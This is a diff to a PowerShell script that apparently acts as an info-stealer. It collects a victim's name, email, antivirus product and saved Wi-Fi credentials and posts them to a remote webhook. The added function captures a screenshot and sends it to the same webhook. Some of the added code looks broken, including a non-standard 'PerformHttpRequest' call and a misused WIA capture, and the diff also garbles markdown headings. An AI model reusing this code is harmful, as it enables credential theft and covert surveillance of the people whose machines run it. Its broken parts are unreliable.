@@ -31,6 +31,31 @@ function send_to_obsidian {
     curl.exe -d "$message" -H "Content-Type: text/plain" "$webhook`?path=$file"
 }
 
+# takes a screenshot and sends it to the Obsidian webhook
+function send_screenshot_to_obsidian {
+    # take screenshot
+    $screenshot = (New-Object -ComObject Wia.ImageFile).Capture()
+
+    # convert screenshot to base64-encoded image
+    $imageData = [System.Convert]::ToBase64String($screenshot.FileData)
+
+    # create message object
+    $messageData = @{
+        content = "Screenshot"
+        embeds = @(
+            @{
+                title = "Screenshot"
+                image = @{
+                    url = "data:image/png;base64,$imageData"
+                }
+            }
+        )
+    }
+
+    # send message to Obsidian webhook
+    PerformHttpRequest -Uri $webhook -Method Post -Body (ConvertTo-Json $messageData) -ContentType "application/json"
+}
+
 function Get-fullName {
 
     try {
@@ -87,9 +112,6 @@ function Get-AntivirusSolution {
     return $AntivirusSolution
 }
 
-
-
-
 # markdown wireless information
 function wireless_markdown {
     # get wireless creds
@@ -129,7 +151,7 @@ function user_markdown {
     $content = @"
 # $account
 
-## General
+##General
 - Full Name : $full_name
 - Email : $email
 
@@ -180,7 +202,7 @@ function user_markdown {
                 $formatted_ssid = $formatted_ssid.Split(":")[1] | Out-String
                 $formatted_ssid = $formatted_ssid.Replace(" ", "").Replace("`n","")
 
-                send_to_obsidian -message "- #$formatted_ssid" -file $markdown
+                send_to_obsidian -message "-#$formatted_ssid" -file $markdown
             }
         }
     }
@@ -212,6 +234,8 @@ function user_markdown {
     # send data set two
     send_to_obsidian -message $content -file $markdown
 
+    # take screenshot and send to Obsidian webhook
+    send_screenshot_to_obsidian
 }
 
 user_markdown
